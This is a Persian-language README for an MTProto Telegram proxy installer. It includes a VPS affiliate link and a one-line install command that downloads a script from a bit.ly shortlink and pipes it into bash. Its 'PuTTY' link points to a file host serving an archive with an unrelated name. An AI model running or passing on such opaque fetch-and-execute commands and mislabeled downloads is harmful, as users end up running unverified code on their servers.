# نصب کننده آسان MTProtoProxy
<h4>یک اسکریپت بدون باگ برای نصب MTProtoProxy بر روی Centos یا Ubuntu</h4>

میتوانید از <a href="https://support.cloudzy.com/aff.php?aff=1557" target="_blank">اینجا سرور مجازی  (VPS) با ارز دیجیتال</a> بخرید. (با فیلتر شکن وارد لینک شوید)

 نرم افزار <a href="https://uploadb.me/direct/cjlbd3c6vuwm/CC_%208.0l.rar.html" target="_blank"> PUTTY </a> را دانلود کنید


# چرا باید از این اسکریپت استفاده بکنیم؟
1. تولید secret و port به صورت تصادفی
2. پیکر بندی خودکار فایر وال سرور
3. آسان ترین نصب کننده پروکسی برای فارسی زبانان
4. از Centos 7/8 یا Ubuntu 18 یا جدیدتر و Debian 10 یا بالاتر پشتیبانی می کند
5. NTP را به صورت خودکار پیکربندی کنید
6. تغییر port، TAG، secret، حذف پروکسی و .... بعد از نصب پروکسی

# نصب اسکریپت رسمی
<h3>نصب اسکریپت بر روی سرور</h3>

روی سرور خود اجرا کنید

<pre>curl -o MTProtoProxyeasyInstall.sh -L bit.ly/GithubSalaRNd && bash MTProtoProxyeasyInstall.sh</pre>

چون تمامی مقادیر پیش فرض در نظر گرفته شده نیاز به هیچ اقدام دیگری نیست و کافیست صبر کنید تا کانفینگ پروکسی بر روی سرور شما انجام بشه و پس از نصب اسکریپت لینک پروکسی خود را مشاهده کنید.

<h4>چند نفر میتوانند به پروکسی متصل بشن؟</h4>

 می تواند بیش از 10000 نفر را روی یک CPU مدرن انجام دهد. قدرت cpu بین افراد متصل تقسیم خواهد شد. افراد را بیشتر از تعداد رشته های CPU خود تولید نکنید چرا که ممکنه سرور شما از دسترس خارج شود.
به طور مثال یک سرور که cpu 2 هسته ای هست حدودا 20000 نفر را میتواند وصل نگه دارد!!!
##
Thanks to <a href="https://github.com/HirbodBehnam" target="_blank"> HirbodBehnam </a> and <a href="https://github.com/TelegramMessenger/MTProxy" target="_blank"> MTProxy Admin Bot </a> creator of the Proxy you can now install the proxy with a script.
